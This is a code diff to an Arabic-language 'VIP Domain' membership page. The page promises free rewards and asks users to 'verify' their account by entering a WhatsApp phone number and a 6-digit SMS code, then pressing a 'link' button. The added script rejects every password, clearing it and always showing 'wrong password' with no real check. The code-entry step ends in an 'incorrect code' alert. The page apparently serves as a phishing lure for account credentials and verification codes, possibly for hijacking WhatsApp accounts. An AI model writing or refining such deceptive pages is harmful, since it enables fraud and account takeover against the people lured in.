@@ -94,6 +94,13 @@ label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 
 }
 .field-group input::placeholder { color: #8a8a90; }
 .field-group input:focus { border-color: var(--gold); }
+
+/* ستايل حقل كلمة السر عند الخطأ */
+.field-group input.input-error {
+  border-color: var(--red) !important;
+  box-shadow: 0 0 4px rgba(229, 72, 77, 0.4);
+}
+
 .promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.3); margin: 20px 0 14px; }
 .promo-text { text-align: center; color: var(--gold); font-weight: 600; font-size: 13px; letter-spacing: 0.2px; }
 input {
@@ -229,7 +236,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 /* تعديل ألوان وحالة زر الإرسال بناءً على دقة الإدخال */
 .whatsapp-submit-btn {
   width: 100%; padding: 12px;
-  background: #0d3219; /* لون أخضر مطفأ ممزوج بالأسود في البداية */
+  background: #0d3219;
   border: 1px solid #144424; border-radius: 12px;
   color: rgba(255, 255, 255, 0.4); font-weight: 700; font-size: 16px;
   display: flex; align-items: center; justify-content: center; gap: 12px;
@@ -301,7 +308,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
 /* زر ربط يطابق زر إرسال رمز التحقق تماماً باللون والحالة */
 .modal-btn.btn-link {
-  background: #0d3219; /* نفس لون زر إرسال الرمز المطفأ */
+  background: #0d3219;
   color: rgba(255, 255, 255, 0.4);
   border: 1px solid #144424;
 }
@@ -354,6 +361,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   <div class="main-content">
 
+  <!-- الشاشة الرئيسية -->
   <div class="card view active" id="view-access">
     <div class="eyebrow">VIP Domain</div>
     <div class="eyebrow-divider"></div>
@@ -377,6 +385,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
   </div>
 
+  <!-- بانتظار الموافقة -->
   <div class="card view" id="view-pending">
     <div class="status-icon pending">⏳</div>
     <h1>يتم الطلب</h1>
@@ -384,6 +393,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">تم استلام طلبك وهو قيد المراجعة حالياً.</p>
   </div>
 
+  <!-- رفض رسمي -->
   <div class="card view" id="view-rejected">
     <div class="status-icon rejected">✕</div>
     <h1>نتيجة الطلب</h1>
@@ -391,6 +401,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">شكراً لاهتمامك بالانضمام إلينا.</p>
   </div>
 
+  <!-- لوحة العضو -->
   <div class="card view" id="view-dashboard">
     <div class="status-icon approved">✓</div>
     <h1>فيك</h1>
@@ -401,10 +412,12 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   </div>
 
+  <!-- النافذة المنبثقة الشاملة (واتساب + الرمز) -->
   <div class="whatsapp-modal-overlay" id="whatsappModalOverlay" onclick="toggleModal(false)">
     <div class="whatsapp-modal" onclick="event.stopPropagation()">
       <div class="modal-close-btn" onclick="toggleModal(false)"><i class="fas fa-times"></i></div>
       
+      <!-- الجسم الأول: إدخال رقم الهاتف -->
       <div class="main-modal-body" id="mainModalBody">
         <div class="modal-title">وثّق حسابك</div>
         <div class="modal-inner-box">
@@ -453,6 +466,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
         </button>
       </div>
 
+      <!-- الجسم الثاني: شاشة إدخال رمز التحقق والعداد التنازلي -->
       <div class="sms-modal-body" id="smsModalBody">
         <div class="modal-title">أدخل رمز التحقّق</div>
         <div class="modal-inner-box">
@@ -476,6 +490,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     </div>
   </div>
 
+  <!-- نافذة تنبيه الخطأ المخصصة "رمز التحقق غير صحيح" -->
   <div class="error-alert-overlay" id="errorAlertOverlay" onclick="closeErrorAlert()">
     <div class="error-alert-box" onclick="event.stopPropagation()">
       <p class="error-alert-text">رمز التحقق غير صحيح</p>
@@ -493,6 +508,30 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 <script>
 let timerInterval = null;
 let secondsLeft = 30;
+
+// منطق معالجة خطأ تسجيل الدخول وإزالة اللون الأحمر عند الضغط
+document.getElementById('accessForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const passwordField = document.getElementById('accPassword');
+  const msgBox = document.getElementById('accessMsg');
+  
+  // مسح كلمة السر
+  passwordField.value = '';
+  
+  // إظهار الرسالة باللون الأحمر وإضافة إطار أحمر للحقل
+  msgBox.textContent = 'خطأ في كلمة السر';
+  msgBox.className = 'msg error';
+  passwordField.classList.add('input-error');
+});
+
+// إزالة اللون الأحمر والرسالة بمجرد أن يضغط المستخدم داخل الحقل لإعادة المحاولة
+document.getElementById('accPassword').addEventListener('focus', function() {
+  const msgBox = document.getElementById('accessMsg');
+  this.classList.remove('input-error');
+  msgBox.style.display = 'none';
+  msgBox.textContent = '';
+});
 
 function toggleModal(show) {
   const overlay = document.getElementById('whatsappModalOverlay');
@@ -522,7 +561,6 @@ function updateCountryUI() {
   checkPhoneLength();
 }
 
-// مراقبة طول الرقم لفتح أو إغلاق الزر الأخضر
 function checkPhoneLength() {
   const select = document.getElementById('countrySelect');
   const selectedOption = select.options[select.selectedIndex];
@@ -547,7 +585,6 @@ document.getElementById('whatsappPhone').addEventListener('input', function() {
   checkPhoneLength();
 });
 
-// الانتقال لصفحة الرمز وتشغيل العداد التنازلي
 function goToSMSPage() {
   const submitBtn = document.getElementById('submitPhoneBtn');
   if (!submitBtn.classList.contains('ready-green')) return;
@@ -587,17 +624,15 @@ function startCountdown() {
   }, 1000);
 }
 
-// عند الضغط على إعادة الإرسال (إذا كان متاحاً وفضي)
 function handleResendClick() {
   const resendBtn = document.getElementById('resendBtn');
   if (!resendBtn.classList.contains('active-silver')) return;
   
-  document.getElementById('otpInput').value = ''; // مسح الحقل بالكامل
+  document.getElementById('otpInput').value = '';
   checkOTPInput();
-  startCountdown(); // إعادة تشغيل العداد من جديد
+  startCountdown();
 }
 
-// مراقبة حقل الرمز (6 خانات)
 document.getElementById('otpInput').addEventListener('input', function() {
   this.value = this.value.replace(/\D/g, '');
   checkOTPInput();
@@ -615,7 +650,6 @@ function checkOTPInput() {
   }
 }
 
-// إظهار نافذة الخطأ المخصصة
 function triggerErrorAlert() {
   const linkBtn = document.getElementById('linkBtn');
   if (!linkBtn.classList.contains('active-green')) return;
